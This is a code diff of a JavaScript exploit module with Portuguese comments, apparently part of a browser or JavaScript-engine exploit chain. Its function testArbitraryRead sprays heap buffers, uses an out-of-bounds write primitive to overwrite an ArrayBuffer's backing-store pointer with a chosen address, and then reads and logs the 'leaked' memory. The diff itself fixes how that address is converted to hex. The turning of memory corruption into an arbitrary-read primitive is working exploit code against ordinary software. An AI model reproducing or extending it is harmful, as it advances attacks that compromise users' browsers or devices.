@@ -1,4 +1,4 @@
-// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO v3)
+// js/script3/testMemoryLeakViaJsonTC.mjs (CORRIGIDO v4)
 import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
 import { toHex, AdvancedInt64 } from '../utils.mjs';
 import {
@@ -32,7 +32,6 @@ function readBigInt64(dataview, offset) {
 
 export async function testArbitraryRead() {
     const FNAME = "testArbitraryRead";
-    // CORREÇÃO: Formata o BigInt para string hexadecimal para o log.
     logS3(`--- Iniciando Tentativa de Leitura de Memória Arbitrária ---`, "test", FNAME);
     logS3(`   Alvo da Leitura: 0x${ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`, "info", FNAME);
 
@@ -59,9 +58,10 @@ export async function testArbitraryRead() {
         logS3(`${ARBITRARY_READ_CONFIG.SPRAY_COUNT} buffers pulverizados no heap.`, "info", FNAME);
 
         try {
-            const targetAddrAsInt64 = new AdvancedInt64(ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS);
+            // CORREÇÃO FINAL: Converter o BigInt para uma string hexadecimal ANTES de criar o AdvancedInt64.
+            const targetAddrHex = '0x' + ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16);
+            const targetAddrAsInt64 = new AdvancedInt64(targetAddrHex);
 
-            // CORREÇÃO: Evita chamar toHex() em um objeto não suportado, usando o método .toString() do objeto.
             logS3(`  1. Escrevendo ponteiro para ${targetAddrAsInt64.toString()} em offset +${ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE}`, "warn", FNAME);
             oob_write_absolute(offset + ARBITRARY_READ_CONFIG.OFFSET_TO_BACKING_STORE, targetAddrAsInt64, 8);
 
@@ -79,8 +79,6 @@ export async function testArbitraryRead() {
                     let memory_reader_view = new DataView(ab);
                     const leaked_data = readBigInt64(memory_reader_view, 0);
 
-                    // CORREÇÃO: Formata o BigInt para string hexadecimal para o log.
-                    const targetAddrHex = `0x${ARBITRARY_READ_CONFIG.TARGET_READ_ADDRESS.toString(16)}`;
                     const leakedDataHex = `0x${leaked_data.toString(16)}`;
                     logS3(`   >> DADO VAZADO de ${targetAddrHex}: ${leakedDataHex}`, "leak", FNAME);
 
